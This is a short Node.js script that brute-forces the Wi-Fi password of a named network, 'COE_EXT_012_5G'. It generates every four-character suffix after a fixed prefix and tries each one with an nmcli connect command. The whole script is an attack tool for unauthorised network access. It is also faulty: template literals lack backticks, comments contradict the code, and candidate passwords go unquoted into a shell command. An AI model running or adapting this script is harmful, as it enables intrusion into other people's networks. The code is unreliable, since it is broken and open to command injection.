const { exec } = require('child_process');

const SSID = "COE_EXT_012_5G";  // 🔁 Replace with your real SSID

// Characters to try for the last 3 positions
const charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";

// Variants of "civil" with different capitalizations
const prefixes = [
    "COE2024"
    // Add/remove based on what you think is realistic
];

// Function to execute a shell command and return a promise
function execCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error || stderr) {
                reject(error || stderr);
            } else {
                resolve(stdout);
            }
        });
    });
}

// Go through all combinations of 3-character suffixes
function generateCombinations(prefix) {
    const suffixLength = 4;
    const generateSuffixes = (charset, length) => {
        const result = [];
        const generate = (str, remainingLength) => {
            if (remainingLength === 0) {
                result.push(str);
                return;
            }
            for (let i = 0; i < charset.length; i++) {
                generate(str + charset[i], remainingLength - 1);
            }
        };
        generate('', length);
        return result;
    };

    const suffixes = generateSuffixes(charset, suffixLength);

    // Try each password
    suffixes.forEach(async (suffix) => {
        const password = prefix + suffix;
        const currentTime = new Date().toLocaleTimeString();
        console.log(Trying password: ${password});
        console.log(Time: ${currentTime});

        // Try to connect using nmcli
        try {
            const result = await execCommand(nmcli dev wifi connect ${SSID} password ${password});
            if (result.includes('successfully')) {
                console.log(✅ Correct password found: ${password});
                process.exit(0);
            } else {
                console.log("❌ Incorrect");
            }
        } catch (error) {
            console.log("❌ Incorrect");
        }
    });
}

// Start the password generation and testing process
prefixes.forEach(prefix => generateCombinations(prefix));